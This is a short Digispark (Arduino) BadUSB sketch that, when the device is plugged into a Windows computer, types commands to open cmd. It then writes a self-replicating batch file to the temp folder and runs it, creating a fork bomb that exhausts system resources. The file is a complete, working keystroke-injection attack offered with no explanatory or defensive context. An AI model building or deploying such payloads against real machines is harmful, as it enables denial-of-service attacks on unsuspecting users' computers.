#include <DigiKeyboardFr.h>

void setup() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboardFr.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboardFr.println("(echo :test && echo start test.bat && echo goto test) > %temp%/test.bat"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);  
  DigiKeyboardFr.println("cd %temp% && test.bat"); 
}

void loop() {}
